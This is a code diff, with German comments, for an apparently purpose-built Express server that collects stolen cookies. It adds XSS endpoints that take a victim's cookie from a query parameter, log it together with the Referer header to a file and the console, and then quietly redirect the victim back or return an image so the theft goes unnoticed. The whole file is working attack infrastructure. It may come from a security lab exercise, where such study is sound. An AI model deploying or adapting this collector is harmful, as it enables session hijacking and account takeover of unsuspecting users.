@@ -10,14 +10,20 @@ const brokenImagePath = path.join(__dirname, '../src/img/image.jpeg');
 
 
 app.get('/xss', (req, res) => {
+    // Extrahiert den 'cookie' aus der Anfrage
     const cookieValue = req.query.cookie;
+    // Extrahiert den 'Referer'-Header aus der Anfrage
     const referer = req.headers.referer;
+    // Prüft, ob sowohl cookieValue als auch referer vorhanden sind
     if (cookieValue && referer) {
-        logCookie(cookieValue.toString(), referer)
+        // Cookie-Wert und den Referer in einer Datei speichern
+        logCookie(cookieValue.toString(), referer);
+        // Loggt den empfangenen Cookie-Wert in der Konsole
         console.log('Received cookie:', cookieValue);
-        res.sendStatus(200)
+        //Sende den User zurück 
+        res.redirect(referer);
     }
-})
+});
 
 app.get('/xss_svg', (req, res) => {
     const cookieValue = req.query.cookie;
@@ -28,6 +34,23 @@ app.get('/xss_svg', (req, res) => {
         res.sendFile(brokenImagePath)
     }
 })
+
+
+app.get('/xss_bild', (req, res) => {
+    // Extrahiert den 'cookie' aus der Anfrage
+    const cookieValue = req.query.cookie;
+     // Extrahiert den 'Referer'-Header aus der Anfrage
+    const referer = req.headers.referer;
+    // Prüft, ob sowohl cookieValue als auch referer vorhanden sind
+    if (cookieValue && referer) {
+        // Cookie-Wert und den Referer in einer Datei speichern
+        logCookie(cookieValue.toString(), referer);
+        // Loggt den empfangenen Cookie-Wert in der Konsole
+        console.log('Received cookie:', cookieValue);
+        // Sendet eine Bilddatei zurück
+        res.sendFile(brokenImagePath);
+    }
+});
 
 
 
